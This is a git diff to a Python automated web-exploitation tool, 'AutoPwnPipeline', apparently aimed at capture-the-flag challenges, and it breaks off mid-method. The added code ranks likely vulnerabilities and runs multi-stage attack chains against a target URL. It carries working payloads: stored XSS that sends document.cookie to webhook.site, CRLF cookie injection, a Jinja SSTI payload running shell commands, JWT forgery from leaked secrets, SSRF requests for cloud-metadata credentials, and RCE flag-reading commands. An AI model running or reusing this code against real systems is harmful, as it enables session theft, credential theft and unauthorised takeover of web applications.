@@ -42,6 +42,7 @@ from modules.client_side import ClientSideAnalyzer
 from modules.php_tricks import PHPTricksEngine
 from modules.eval_injection import EvalInjectionEngine
 from modules.nosql_injection import NoSQLInjectionEngine
+from modules.reasoning_engine import ReasoningEngine
 
 
 
@@ -93,14 +94,18 @@ class AutoPwnPipeline:
             self.state["curl_commands"].append(curl_cmd)
 
     def _check_and_store_flags(self, text: str, source_context: str = ""):
-        """Scan text for CTF flags, print victory panel, and store in state."""
+        """Scan text for CTF flags, print victory panel, and store in state.
+        Returns True if at least one new flag was captured."""
         found = find_flags(text, self.flag_prefix)
+        captured_any = False
         if found:
             for f in set(found):
                 if f not in self.state["captured_flags"]:
                     self.state["captured_flags"].add(f)
                     print_flag(f)
                     self._log_step("Phase 7: Flag Capture", f"Captured flag from {source_context}: {f}")
+                    captured_any = True
+        return captured_any
 
     def run(self):
         """Execute the complete 7-Phase Offensive Pipeline."""
@@ -187,6 +192,12 @@ class AutoPwnPipeline:
             self.state["inline_scripts"].extend(parsed.get("inline_scripts", []))
             self.state["forms"].extend(parsed["forms"])
 
+            # Extract parameters directly from the target URL query string
+            from urllib.parse import urlparse, parse_qs
+            qs = parse_qs(urlparse(self.target_url).query)
+            for p in qs:
+                self.state["parameters"].add(p)
+
             print_info(f"Discovered [bold green]{len(self.state['endpoints'])}[/bold green] Endpoints, [bold green]{len(self.state['forms'])}[/bold green] Forms, [bold green]{len(self.state['scripts'])}[/bold green] Scripts, [bold green]{len(self.state['parameters'])}[/bold green] Input Parameters.")
 
         except Exception as e:
@@ -251,6 +262,8 @@ class AutoPwnPipeline:
         if reflected_params:
             print_success(f"Reflected Input Parameters Detected: {', '.join(reflected_params)}")
             self._log_step("Phase 2: Analysis", f"Parameters reflecting input: {reflected_params}")
+        # Store for later phases (predictive ranking in Phase 3b)
+        self.state["reflected_params"] = reflected_params
 
         # 3. JWT Inspection
         for cname, token in self.state["jwt_tokens"]:
@@ -300,44 +313,708 @@ class AutoPwnPipeline:
         else:
             print_info("Standard attack surface mapped across discovered endpoints.")
 
+        # ── Deep Reasoning Integration ─────────────────────────────────────
+        # Run the hypothesis-driven reasoning engine to generate offensive
+        # hypotheses, correlate evidence, and build a multi-step attack plan
+        # for complex challenges that static payload lists cannot handle.
+        print_info("Running Deep Reasoning Engine for complex challenge analysis...")
+        try:
+            reasoning = ReasoningEngine(self.target_url, session=self.session, state=self.state)
+            reasoning_report = reasoning.run_full_reasoning()
+
+            # Store reasoning results in pipeline state for later phases
+            self.state["reasoning_hypotheses"] = reasoning_report["hypotheses"]
+            self.state["reasoning_correlations"] = reasoning_report["correlations"]
+            self.state["reasoning_plan"] = reasoning_report["attack_plan"]
+            self.state["reasoning_logic_findings"] = reasoning_report["logic_findings"]
+
+            # Log reasoning steps into the attack graph
+            for h in reasoning_report["hypotheses"][:5]:
+                self._log_step(
+                    "Phase 3: Deep Reasoning",
+                    f"Hypothesis: {h['title']} (confidence {h['confidence']*100:.0f}%)",
+                    details="; ".join(h["evidence"][:2])
+                )
+            for f in reasoning_report["logic_findings"]:
+                self._log_step(
+                    "Phase 3: Deep Reasoning",
+                    f"Logic Flaw Confirmed: {f['title']}",
+                    details=f.get("evidence", "")
+                )
+        except Exception as e:
+            print_warning(f"Deep reasoning engine encountered an issue: {e}")
+
+        # ── Predictive Vulnerability Ranking (Phase 3b) ─────────────────
+        # Use all recon evidence to predict the most likely vuln classes
+        # BEFORE active exploitation, so Phase 4 prioritizes the best vectors.
+        self._predict_vulnerabilities()
+
+    # =========================================================================
+    # PHASE 3b: التوقع الاستباقي للثغرات (Predictive Vulnerability Ranking)
+    # =========================================================================
+    def _predict_vulnerabilities(self):
+        """
+        Predict the most likely vulnerability classes BEFORE active exploitation,
+        using all recon evidence gathered in Phases 1-3. Produces a ranked list
+        of (vuln_class, confidence, evidence) and stores it in state so that
+        Phase 4 can prioritize the most promising exploit vectors first.
+        """
+        print_info("Predicting likely vulnerability classes from recon evidence...")
+        predictions = []  # list of (vuln_class, confidence, evidence)
+
+        html = self.state.get("baseline_html", "")
+        tech = [t.lower() for t in self.state.get("tech_stack", [])]
+        params = list(self.state.get("parameters", []))
+        forms = self.state.get("forms", [])
+        endpoints = list(self.state.get("endpoints", []))
+        leaked = " ".join(self.state.get("leaked_source_files", {}).values())
+        all_source = html + " " + leaked
+        cookies = self.state.get("cookies", {})
+        jwt_tokens = self.state.get("jwt_tokens", [])
+        reflected = self.state.get("reflected_params", [])
+        sensitive_hits = self.state.get("sensitive_hits", [])
+
+        # ── 1. Tech-stack driven predictions ─────────────────────────────
+        if any("php" in t for t in tech):
+            predictions.append(("php_tricks", 0.75, "PHP stack detected - type juggling / header spoofing likely"))
+        if any("node" in t or "express" in t or "javascript" in t for t in tech):
+            predictions.append(("nosql", 0.7, "Node.js/Express stack - NoSQL injection surface"))
+        if any("python" in t or "flask" in t or "django" in t for t in tech):
+            predictions.append(("ssti", 0.7, "Python web framework - SSTI likely"))
+        if any("java" in t or "spring" in t for t in tech):
+            predictions.append(("deserialization", 0.6, "Java stack - deserialization surface"))
+
+        # ── 2. Parameter-name driven predictions ─────────────────────────
+        for p in params:
+            pl = p.lower()
+            if any(k in pl for k in ["file", "page", "include", "view", "path", "doc", "template"]):
+                predictions.append(("lfi", 0.85, f"Parameter '{p}' suggests file inclusion"))
+            elif any(k in pl for k in ["cmd", "ip", "host", "ping", "exec", "run", "query"]):
+                predictions.append(("cmd_injection", 0.85, f"Parameter '{p}' suggests command execution"))
+            elif any(k in pl for k in ["id", "user", "name", "search", "q", "category", "username"]):
+                predictions.append(("sqli", 0.7, f"Parameter '{p}' suggests SQL query surface"))
+            elif any(k in pl for k in ["url", "link", "redirect", "src", "fetch", "media_uri"]):
+                predictions.append(("ssrf", 0.8, f"Parameter '{p}' suggests URL fetching"))
+
+        # ── 3. Reflection-driven predictions ─────────────────────────────
+        if reflected:
+            predictions.append(("xss", 0.8, f"Parameters reflect input: {', '.join(reflected)}"))
+            predictions.append(("ssti", 0.6, "Reflected input may hit template engine"))
+
+        # ── 4. Form-driven predictions ───────────────────────────────────
+        for f in forms:
+            names = [i.get("name", "").lower() for i in f.get("inputs", [])]
+            if any("pass" in n for n in names):
+                predictions.append(("auth_bypass", 0.8, "Login form detected - auth bypass / SQLi surface"))
+            if any(i.get("type") == "file" for i in f.get("inputs", [])):
+                predictions.append(("file_upload", 0.85, "File upload form detected - webshell surface"))
+            if any(k in n for n in names for k in ["message", "comment", "post", "content", "text", "msg"]):
+                predictions.append(("xss_to_admin", 0.7, "Message/comment form detected - stored XSS surface"))
+
+        # ── 5. Admin-bot / report endpoint prediction ────────────────────
+        has_report = any(any(k in ep.lower() for k in ["report", "contact", "admin", "bot", "visit"]) for ep in endpoints)
+        if has_report:
+            predictions.append(("xss_to_admin", 0.85, "Admin bot / report endpoint detected - XSS-to-admin likely"))
+
+        # ── 6. JWT / cookie prediction ───────────────────────────────────
+        if jwt_tokens:
+            predictions.append(("jwt", 0.85, f"JWT token detected in cookie: {jwt_tokens[0][0]}"))
+        if any("session" in c.lower() or "token" in c.lower() for c in cookies):
+            predictions.append(("cookie_manipulation", 0.6, "Session/token cookie detected - manipulation surface"))
+
+        # ── 7. Sensitive-file leak prediction ────────────────────────────
+        if sensitive_hits:
+            predictions.append(("source_leak", 0.9, f"{len(sensitive_hits)} sensitive files leaked - source analysis surface"))
+
+        # ── 8. Leaked-source driven predictions ──────────────────────────
+        if re.search(r"shell_exec\s*\(|system\s*\(|exec\s*\(|passthru\s*\(", all_source):
+            predictions.append(("cmd_injection", 0.9, "Source reveals shell_exec/system - command injection"))
+        if re.search(r"SELECT.*\$_(GET|POST|REQUEST)|query\s*\(\s*['\"].*\$", all_source, re.IGNORECASE):
+            predictions.append(("sqli", 0.85, "Source reveals unsanitized SQL interpolation"))
+        if re.search(r"eval\s*\(|exec\s*\(|Function\s*\(|child_process", all_source, re.IGNORECASE):
+            predictions.append(("eval_injection", 0.8, "Source reveals eval()/exec() - code injection"))
+        if re.search(r"pickle\.loads|yaml\.load|unserialize|JSON\.parse", all_source, re.IGNORECASE):
+            predictions.append(("deserialization", 0.85, "Source reveals insecure deserialization sink"))
+
+        # ── Aggregate: keep highest confidence per vuln class ────────────
+        best = {}
+        for vc, conf, ev in predictions:
+            if vc not in best or conf > best[vc][0]:
+                best[vc] = (conf, ev)
+        ranked = sorted(best.items(), key=lambda kv: kv[1][0], reverse=True)
+
+        # Store in state for Phase 4 prioritization
+        self.state["predictions"] = [
+            {"vuln_class": vc, "confidence": round(conf, 2), "evidence": ev}
+            for vc, (conf, ev) in ranked
+        ]
+
+        if ranked:
+            rows = [[vc, f"{conf*100:.0f}%", ev] for vc, (conf, ev) in ranked]
+            print_table(["Predicted Vuln", "Confidence", "Evidence"], rows, title="Predictive Vulnerability Ranking (Pre-Exploitation)")
+            for vc, (conf, ev) in ranked[:3]:
+                self._log_step("Phase 3b: Prediction", f"Predicted {vc} ({conf*100:.0f}%) - {ev}")
+        else:
+            print_info("No strong vulnerability predictions from recon evidence.")
+
     # =========================================================================
     # PHASE 4: الاستغلال الفعلي (Active Exploitation)
     # =========================================================================
 
     def phase4_active_exploitation(self):
         print_header("المرحلة 4: الاستغلال الفعلي", "Phase 4: Active Multi-Vector Exploitation")
-        
-        # 1. Arbitrary File Upload & Webshells
-        self._exploit_file_upload()
 
-        # 2. SSTI Probing & Weaponization
-        self._exploit_ssti()
+        # ── Predictive prioritization ────────────────────────────────────
+        # Run the exploit vectors that were predicted as most likely FIRST,
+        # so the tool focuses effort on the highest-confidence attack surface.
+        predictions = self.state.get("predictions", [])
+        predicted_classes = {p["vuln_class"] for p in predictions}
+        if predicted_classes:
+            print_info(f"Prioritizing predicted vectors: {', '.join(sorted(predicted_classes))}")
 
-        # 3. LFI & PHP Stream Wrappers Probing
-        self._exploit_lfi()
+        # Map vuln_class -> exploit method
+        exploit_map = {
+            "file_upload": self._exploit_file_upload,
+            "ssti": self._exploit_ssti,
+            "lfi": self._exploit_lfi,
+            "cmd_injection": self._exploit_command_injection,
+            "deserialization": self._exploit_deserialization,
+            "nosql": self._exploit_nosql,
+            "sqli": self._exploit_sqli,
+            "jwt": self._exploit_jwt,
+            "xss_to_admin": self._exploit_xss_to_admin,
+            "php_tricks": self._exploit_php_tricks,
+            "eval_injection": self._exploit_eval_injection,
+        }
 
-        # 4. Command Injection Probing
-        self._exploit_command_injection()
+        # Run predicted vectors first (highest confidence first)
+        run_order = []
+        for p in sorted(predictions, key=lambda x: x["confidence"], reverse=True):
+            vc = p["vuln_class"]
+            if vc in exploit_map and vc not in run_order:
+                run_order.append(vc)
+        # Then run the remaining vectors in default order
+        for vc in exploit_map:
+            if vc not in run_order:
+                run_order.append(vc)
 
-        # 5. Insecure Deserialization Probing
-        self._exploit_deserialization()
-        # 6. NoSQL Injection & MongoDB Auth Bypass (Priority for Node.js/Express targets)
-        self._exploit_nosql()
+        for vc in run_order:
+            try:
+                exploit_map[vc]()
+            except Exception as e:
+                print_warning(f"Exploit vector '{vc}' failed: {e}")
 
-        # 7. SQL Injection & Auth Bypasses
-        self._exploit_sqli()
-
-        # 8. JWT Exploitation
-        self._exploit_jwt()
-
-        # 9. Client-Side Cryptographic & Scrambled Binary / Image Reconstruction
+        # Always run these regardless of prediction (broad coverage)
         self._exploit_client_side_crypto()
+        self._exploit_reasoning_driven()
+        # Execute the multi-stage reasoning plan (complex challenges)
+        self._exploit_reasoning_plan()
+        # Feedback loop: feed exploitation results back into reasoning engine
+        self._feed_exploitation_results_to_reasoning()
 
-        # 10. PHP-Specific Logic, Type Juggling, Header Spoofing & Stream Wrappers
-        self._exploit_php_tricks()
 
-        # 11. Eval / Code Injection RCE (Python eval, Node.js eval, PHP eval)
-        self._exploit_eval_injection()
+    def _exploit_reasoning_driven(self):
+        """
+        Execute exploitation steps derived from the Deep Reasoning Engine.
+        Handles complex application-logic flaws that static payload lists miss:
+        CRLF/Header injection, PHP type juggling, array injection, cookie manipulation.
+        """
+        print_info("Executing Deep Reasoning-Driven Exploitation (complex logic flaws)...")
+
+        # 1. Re-run logic audit to get fresh active findings
+        try:
+            reasoning = ReasoningEngine(self.target_url, session=self.session, state=self.state)
+            logic_findings = reasoning.audit_application_logic()
+        except Exception as e:
+            print_warning(f"Reasoning logic audit failed: {e}")
+            return
+
+        if not logic_findings:
+            print_info("No additional complex logic flaws confirmed by reasoning engine.")
+            return
+
+        for finding in logic_findings:
+            vc = finding["vuln_class"]
+            print_success(f"Reasoning Engine Confirmed: [bold yellow]{finding['title']}[/bold yellow]")
+            self._log_step(
+                "Phase 4: Deep Reasoning Exploit",
+                f"Exploited {vc}: {finding['title']}",
+                details=finding.get("evidence", ""),
+                curl_cmd=f"curl -s '{self.target_url}?{finding.get('param','')}={finding.get('payload','')}'"
+            )
+
+            # ── CRLF / Header Injection Exploitation ──────────────────────
+            if vc == "crlf_injection":
+                param = finding.get("param", "lang")
+                # Build clean base URL (strip query string)
+                from urllib.parse import urlparse
+                _p = urlparse(self.target_url)
+                base_url = f"{_p.scheme}://{_p.netloc}{_p.path}"
+                # Attempt Set-Cookie admin escalation
+                admin_cookie_payload = f"fr%0d%0aSet-Cookie:%20admin=1%3b%20Path%3d/"
+                try:
+                    r = self.session.get(
+                        f"{base_url}?{param}={admin_cookie_payload}",
+                        allow_redirects=False,
+                        timeout=5
+                    )
+                    # Check if admin cookie was set
+                    resp_cookies = r.cookies.get_dict()
+                    if "admin" in resp_cookies or "admin" in str(r.headers.get("Set-Cookie", "")):
+                        print_success("CRLF injection set 'admin' cookie! Attempting privileged access...")
+                        self._log_step(
+                            "Phase 4: Deep Reasoning Exploit",
+                            "CRLF Set-Cookie injection set admin cookie",
+                            details=f"Param: {param} | Cookie: admin=1"
+                        )
+                        # Now request protected pages with the forged cookie
+                        for protected in ["/admin", "/dashboard", "/profile", "/flag", "/admin.php"]:
+                            try:
+                                pr = self.session.get(urljoin(base_url, protected), timeout=5)
+                                self._check_and_store_flags(pr.text, f"Protected page {protected} (via CRLF admin cookie)")
+                            except Exception:
+                                pass
+                except Exception:
+                    pass
+
+            # ── Type Juggling / Array Injection ───────────────────────────
+            elif vc == "type_juggling":
+                # The finding already contains the successful payload; re-request
+                # and check for flag in the authenticated response.
+                param = finding.get("param", "password")
+                payload = finding.get("payload", "0e462097431906509019562988736854")
+                try:
+                    # Determine form action from state
+                    action = self.target_url
+                    for form in self.state.get("forms", []):
+                        if any("pass" in i.get("name", "").lower() for i in form.get("inputs", [])):
+                            action = form.get("action", self.target_url)
+                            break
+                    if "[]" in payload:
+                        # Array injection
+                        data = {param: ["x"]}
+                        r = self.session.post(action, data=data, timeout=5)
+                    else:
+                        # Magic hash
+                        data = {param: payload, "username": "admin", "user": "admin", "login": "admin"}
+                        r = self.session.post(action, data=data, timeout=5)
+                    self._check_and_store_flags(r.text, f"Type juggling bypass on {action}")
+                    # Follow redirects to authenticated area
+                    if r.status_code in [301, 302]:
+                        loc = r.headers.get("Location", "")
+                        if loc:
+                            try:
+                                r2 = self.session.get(urljoin(action, loc), timeout=5)
+                                self._check_and_store_flags(r2.text, f"Authenticated page after type juggling: {loc}")
+                            except Exception:
+                                pass
+                except Exception:
+                    pass
+
+
+    def _exploit_reasoning_plan(self):
+        """
+        Execute the multi-step attack plan produced by the Deep Reasoning Engine.
+        Handles COMPLEX multi-stage challenges by walking the dependency chain:
+        prerequisite -> exploit -> escalate -> capture. Each step's success feeds
+        the next step, and results are fed back into the reasoning engine for
+        adaptive re-planning.
+        """
+        plan = self.state.get("reasoning_plan", [])
+        if not plan:
+            print_info("No multi-step reasoning plan available to execute.")
+            return
+
+        print_info("Executing Deep Reasoning Multi-Stage Attack Plan...")
+        executed = {}  # step_num -> success bool
+        chain_results = {}  # chain_name -> list of step results
+
+        # Execute steps in dependency order (topological sort by depends_on)
+        remaining = list(plan)
+        progress = True
+        while remaining and progress:
+            progress = False
+            for step in list(remaining):
+                deps = step.get("depends_on", [])
+                # A step is ready when all its dependencies have been attempted
+                if all(d in executed for d in deps):
+                    remaining.remove(step)
+                    success = self._execute_reasoning_step(step, executed, chain_results)
+                    executed[step["step"]] = success
+                    progress = True
+
+        # ── Feedback loop: feed chain results back into reasoning state ──
+        if chain_results:
+            self.state["reasoning_chain_results"] = chain_results
+            completed = {name: res for name, res in chain_results.items() if any(r for r in res)}
+            if completed:
+                print_success(f"Multi-stage chains with progress: {', '.join(completed.keys())}")
+                self._log_step(
+                    "Phase 4: Reasoning Plan",
+                    f"Multi-stage chains progressed: {', '.join(completed.keys())}",
+                    details="; ".join(f"{k}: {sum(1 for r in v if r)}/{len(v)} steps" for k, v in completed.items())
+                )
+
+    def _feed_exploitation_results_to_reasoning(self):
+        """
+        Feedback loop: collect Phase 4 exploitation results (successes, failures,
+        captured flags, RCE availability) and feed them back into the reasoning
+        engine so it can adaptively re-plan for complex multi-stage challenges.
+        """
+        results = {
+            "captured_flags": list(self.state.get("captured_flags", [])),
+            "active_rce_method": bool(self.state.get("active_rce_method")),
+            "leaked_secrets": dict(self.state.get("leaked_secrets", {})),
+            "admin_accessible": bool(self.state.get("admin_accessible")),
+            "admin_bot_triggered": bool(self.state.get("admin_bot_triggered")),
+            "xss_payload_submitted": bool(self.state.get("xss_payload_submitted")),
+            "chain_results": self.state.get("reasoning_chain_results", {}),
+            "predictions": self.state.get("predictions", []),
+        }
+        self.state["exploitation_feedback"] = results
+
+        # If we have RCE, feed it into the reasoning engine for deeper analysis
+        if self.state.get("active_rce_method"):
+            print_info("Feeding RCE capability back into reasoning engine for deeper exploitation...")
+            try:
+                reasoning = ReasoningEngine(self.target_url, session=self.session, state=self.state)
+                # Re-run reasoning with RCE context to find post-exploitation chains
+                reasoning_report = reasoning.run_full_reasoning()
+                self.state["reasoning_hypotheses"] = reasoning_report["hypotheses"]
+                self.state["reasoning_plan"] = reasoning_report["attack_plan"]
+                self.state["reasoning_logic_findings"] = reasoning_report["logic_findings"]
+                print_success("Reasoning engine re-planned with RCE context for post-exploitation chains.")
+            except Exception as e:
+                print_warning(f"Reasoning re-plan with RCE context failed: {e}")
+
+    def _execute_reasoning_step(self, step, executed, chain_results):
+        """
+        Execute a single step of the multi-stage reasoning plan.
+        Returns True if the step produced a meaningful result (flag, RCE, auth).
+        """
+        goal = step.get("goal", "")
+        hypothesis = step.get("hypothesis", "")
+        chain = step.get("chain", "")
+        action = step.get("action", "")
+        print_info(f"  [Reasoning Plan] Step {step['step']}: {goal}")
+
+        # Track per-chain results
+        if chain:
+            chain_results.setdefault(chain, [])
+
+        success = False
+
+        # ── XSS-to-Admin chain steps ────────────────────────────────────
+        if chain == "XSS -> Admin Bot -> Flag":
+            success = self._execute_xss_chain_step(step, executed)
+        # ── LFI -> Secret -> Session -> Admin -> SSTI chain ─────────────
+        elif chain == "LFI -> Secret Leak -> Session Forgery -> Admin -> SSTI":
+            success = self._execute_lfi_chain_step(step, executed)
+        # ── SQLi -> Auth Bypass -> Admin -> Flag chain ──────────────────
+        elif chain == "SQLi -> Auth Bypass -> Admin -> Flag":
+            success = self._execute_sqli_chain_step(step, executed)
+        # ── SSRF -> Cloud Metadata -> Credentials -> Admin chain ────────
+        elif chain == "SSRF -> Cloud Metadata -> Credentials -> Admin":
+            success = self._execute_ssrf_chain_step(step, executed)
+        # ── Deserialization -> RCE -> Flag chain ────────────────────────
+        elif chain == "Deserialization -> RCE -> Flag":
+            success = self._execute_deser_chain_step(step, executed)
+        # ── File Upload -> Webshell -> RCE -> Flag chain ────────────────
+        elif chain == "File Upload -> Webshell -> RCE -> Flag":
+            success = self._execute_upload_chain_step(step, executed)
+        # ── Generic hypothesis step (fallback to existing exploit) ──────
+        elif hypothesis:
+            success = self._execute_hypothesis_step(hypothesis, step)
+
+        if chain:
+            chain_results[chain].append(success)
+        return success
+
+    def _execute_hypothesis_step(self, hypothesis, step):
+        """Fallback: route a hypothesis step to the matching exploit method."""
+        exploit_map = {
+            "xss_to_admin": self._exploit_xss_to_admin,
+            "ssti": self._exploit_ssti,
+            "lfi": self._exploit_lfi,
+            "cmd_injection": self._exploit_command_injection,
+            "deserialization": self._exploit_deserialization,
+            "nosql": self._exploit_nosql,
+            "sqli": self._exploit_sqli,
+            "jwt": self._exploit_jwt,
+            "php_tricks": self._exploit_php_tricks,
+            "eval_injection": self._exploit_eval_injection,
+            "file_upload": self._exploit_file_upload,
+        }
+        method = exploit_map.get(hypothesis)
+        if not method:
+            return False
+        try:
+            method()
+            return True
+        except Exception as e:
+            print_warning(f"  [Reasoning Plan] Hypothesis step '{hypothesis}' failed: {e}")
+            return False
+
+    def _execute_xss_chain_step(self, step, executed):
+        """Execute a step of the XSS -> Admin Bot -> Flag chain."""
+        goal = step.get("goal", "")
+        if "Inject stored XSS" in goal:
+            # Submit XSS payload into message/comment form
+            return self._submit_stored_xss_payload()
+        elif "Trigger admin bot" in goal:
+            # Submit report URL to admin bot endpoint
+            return self._trigger_admin_bot()
+        elif "Steal admin session" in goal or "execute admin action" in goal:
+            # Check if admin bot visited and we captured a session/flag
+            return self._check_admin_bot_result()
+        elif "Capture flag from admin" in goal:
+            # Try to read flag from admin-only page
+            return self._read_admin_flag()
+        return False
+
+    def _submit_stored_xss_payload(self):
+        """Submit a stored XSS payload into a message/comment form."""
+        from modules.cheatsheet import XSS_EVASION
+        payloads = [p["payload"] for p in XSS_EVASION[:5]] if XSS_EVASION else []
+        payloads += [
+            '<script>fetch("https://webhook.site/"+document.cookie)</script>',
+            '<img src=x onerror="fetch(\'https://webhook.site/\'+document.cookie)">',
+            '<svg onload="fetch(\'https://webhook.site/\'+document.cookie)">',
+        ]
+        for form in self.state.get("forms", []):
+            inputs = form.get("inputs", [])
+            msg_field = next((i.get("name") for i in inputs
+                              if any(k in i.get("name", "").lower() for k in ["message", "comment", "post", "content", "text", "msg"])), None)
+            if not msg_field:
+                continue
+            action = form.get("action", self.target_url)
+            method = form.get("method", "POST")
+            for payload in payloads:
+                data = {msg_field: payload}
+                for i in inputs:
+                    n = i.get("name")
+                    if n and n != msg_field and i.get("type") not in ["submit", "button"]:
+                        data.setdefault(n, "")
+                try:
+                    if method.upper() == "POST":
+                        r = self.session.post(action, data=data, timeout=5)
+                    else:
+                        r = self.session.get(action, params=data, timeout=5)
+                    # Check if payload reflected/stored
+                    if payload.split(">")[0] in r.text or "success" in r.text.lower():
+                        print_success(f"  [XSS Chain] Stored XSS payload submitted: {payload[:60]}")
+                        self.state["xss_payload_submitted"] = payload
+                        self._log_step("Phase 4: XSS Chain", "Stored XSS payload submitted", details=payload[:80])
+                        return True
+                except Exception:
+                    pass
+        return False
+
+    def _trigger_admin_bot(self):
+        """Submit the stored XSS URL to the admin bot / report endpoint."""
+        payload = self.state.get("xss_payload_submitted")
+        if not payload:
+            return False
+        # Find report endpoint
+        for ep in self.state.get("endpoints", []):
+            if any(k in ep.lower() for k in ["report", "contact", "bot", "visit"]):
+                report_url = urljoin(self.target_url, ep)
+                try:
+                    # Try common report params
+                    for param in ["url", "link", "target", "site", "page"]:
+                        r = self.session.post(report_url, data={param: self.target_url}, timeout=5)
+                        if r.status_code in [200, 302]:
+                            print_success(f"  [XSS Chain] Admin bot triggered via {report_url}")
+                            self.state["admin_bot_triggered"] = True
+                            self._log_step("Phase 4: XSS Chain", "Admin bot triggered", details=report_url)
+                            return True
+                except Exception:
+                    pass
+        return False
+
+    def _check_admin_bot_result(self):
+        """Check if the admin bot visit produced a flag or session leak."""
+        # Re-request admin pages in case the bot's action revealed a flag
+        for path in ["/admin", "/flag", "/admin/flag", "/dashboard"]:
+            try:
+                r = self.session.get(urljoin(self.target_url, path), timeout=5)
+                if self._check_and_store_flags(r.text, f"Admin bot result ({path})"):
+                    return True
+            except Exception:
+                pass
+        return False
+
+    def _read_admin_flag(self):
+        """Try to read the flag from admin-only pages."""
+        for path in ["/admin", "/admin/flag", "/flag", "/admin/dashboard", "/panel"]:
+            try:
+                r = self.session.get(urljoin(self.target_url, path), timeout=5)
+                if self._check_and_store_flags(r.text, f"Admin flag ({path})"):
+                    return True
+            except Exception:
+                pass
+        return False
+
+    def _execute_lfi_chain_step(self, step, executed):
+        """Execute a step of the LFI -> Secret -> Session -> Admin -> SSTI chain."""
+        goal = step.get("goal", "")
+        if "Leak source via LFI" in goal:
+            return self._exploit_lfi() or bool(self.state.get("leaked_source_files"))
+        elif "Extract SECRET_KEY" in goal:
+            for fname, content in self.state.get("leaked_source_files", {}).items():
+                m = re.search(r"(?:SECRET_KEY|JWT_SECRET|APP_SECRET)\s*=\s*['\"]([^'\"]+)['\"]", content, re.IGNORECASE)
+                if m:
+                    self.state["leaked_secrets"]["secret_key"] = m.group(1)
+                    print_success(f"  [LFI Chain] Extracted SECRET_KEY: {m.group(1)}")
+                    return True
+            return False
+        elif "Forge admin session" in goal:
+            secret = self.state.get("leaked_secrets", {}).get("secret_key")
+            if not secret:
+                return False
+            try:
+                forged = sign_jwt_hs256({}, {"user": "admin", "role": "admin", "isAdmin": True}, secret)
+                self.state["forged_admin_token"] = forged
+                print_success("  [LFI Chain] Forged admin session token")
+                return True
+            except Exception:
+                return False
+        elif "Access admin panel" in goal:
+            forged = self.state.get("forged_admin_token")
+            if not forged:
+                return False
+            for path in ["/admin", "/admin/dashboard", "/dashboard", "/panel"]:
+                try:
+                    r = self.session.get(urljoin(self.target_url, path),
+                                         cookies={"session": forged, "jwt": forged, "token": forged}, timeout=5)
+                    if r.status_code == 200:
+                        print_success(f"  [LFI Chain] Admin access granted via forged token: {path}")
+                        self.state["admin_accessible"] = True
+                        return True
+                except Exception:
+                    pass
+            return False
+        elif "SSTI in admin template" in goal:
+            if not self.state.get("admin_accessible"):
+                return False
+            forged = self.state.get("forged_admin_token")
+            for path in ["/admin", "/admin/dashboard", "/panel"]:
+                try:
+                    r = self.session.get(urljoin(self.target_url, path),
+                                         cookies={"session": forged}, timeout=5)
+                    params = extract_forms_and_links(r.text, urljoin(self.target_url, path))["parameters"]
+                    for p in params:
+                        ssti_resp = self.session.get(
+                            urljoin(self.target_url, path),
+                            params={p: "{{ lipsum.__globals__['os'].popen('cat /flag* || cat /root/*flag*').read() }}"},
+                            cookies={"session": forged}, timeout=5)
+                        if self._check_and_store_flags(ssti_resp.text, f"Admin SSTI ({p})"):
+                            return True
+                except Exception:
+                    pass
+            return False
+        return False
+
+    def _execute_sqli_chain_step(self, step, executed):
+        """Execute a step of the SQLi -> Auth Bypass -> Admin -> Flag chain."""
+        goal = step.get("goal", "")
+        if "Bypass login via SQLi" in goal:
+            return self._exploit_sqli()
+        elif "Access admin session" in goal:
+            return self._check_admin_flag_pages()
+        elif "Capture flag from admin" in goal:
+            return self._read_admin_flag()
+        return False
+
+    def _execute_ssrf_chain_step(self, step, executed):
+        """Execute a step of the SSRF -> Cloud Metadata -> Credentials -> Admin chain."""
+        goal = step.get("goal", "")
+        if "Trigger SSRF" in goal:
+            return self._exploit_ssrf()
+        elif "Extract cloud credentials" in goal:
+            return self._check_ssrf_credentials()
+        elif "Use credentials for admin" in goal:
+            return self._check_admin_flag_pages()
+        return False
+
+    def _execute_deser_chain_step(self, step, executed):
+        """Execute a step of the Deserialization -> RCE -> Flag chain."""
+        goal = step.get("goal", "")
+        if "Inject deserialization" in goal:
+            return self._exploit_deserialization()
+        elif "Achieve RCE" in goal:
+            return bool(self.state.get("active_rce_method"))
+        elif "Capture flag via RCE" in goal:
+            if self.state.get("active_rce_method"):
+                try:
+                    out = self.state["active_rce_method"]("cat /flag* || cat /flag.txt || find / -name '*flag*' 2>/dev/null")
+                    return self._check_and_store_flags(out, "Deserialization RCE flag")
+                except Exception:
+                    pass
+            return False
+        return False
+
+    def _execute_upload_chain_step(self, step, executed):
+        """Execute a step of the File Upload -> Webshell -> RCE -> Flag chain."""
+        goal = step.get("goal", "")
+        if "Upload malicious file" in goal:
+            return self._exploit_file_upload()
+        elif "Access uploaded file" in goal:
+            return bool(self.state.get("active_rce_method"))
+        elif "Execute commands via webshell" in goal:
+            return bool(self.state.get("active_rce_method"))
+        elif "Capture flag" in goal:
+            if self.state.get("active_rce_method"):
+                try:
+                    out = self.state["active_rce_method"]("cat /flag* || cat /flag.txt || find / -name '*flag*' 2>/dev/null")
+                    return self._check_and_store_flags(out, "Webshell RCE flag")
+                except Exception:
+                    pass
+            return False
+        return False
+
+    def _exploit_ssrf(self):
+        """Probe for SSRF via URL-fetching parameters (cloud metadata + internal)."""
+        from modules.ssrf import CLOUD_METADATA_ENDPOINTS, obfuscate_ip
+        params = list(self.state.get("parameters", []))
+        ssrf_params = [p for p in params if any(k in p.lower() for k in ["url", "link", "redirect", "src", "fetch", "media_uri", "host", "ip"])]
+        if not ssrf_params:
+            return False
+        success = False
+        for p in ssrf_params:
+            for meta in CLOUD_METADATA_ENDPOINTS[:3]:
+                try:
+                    r = self.session.get(self.target_url, params={p: meta["url"]}, timeout=5)
+                    if r.status_code == 200 and any(k in r.text.lower() for k in ["accesskey", "secret", "token", "client_id", "account", "role"]):
+                        print_success(f"  [SSRF Chain] Cloud metadata leaked via '{p}': {meta['provider']}")
+                        self._log_step("Phase 4: SSRF Chain", f"SSRF leaked {meta['provider']} metadata", details=meta["url"])
+                        self._check_and_store_flags(r.text, f"SSRF metadata ({meta['provider']})")
+                        success = True
+                except Exception:
+                    pass
+        return success
+
+    def _check_ssrf_credentials(self):
+        """Check if SSRF leaked cloud credentials (IMDS/metadata)."""
+        for path in ["/admin", "/flag", "/dashboard"]:
+            try:
+                r = self.session.get(urljoin(self.target_url, path), timeout=5)
+                if self._check_and_store_flags(r.text, f"SSRF credential use ({path})"):
+                    return True
+            except Exception:
+                pass
+        return False
+
+    def _check_admin_flag_pages(self):
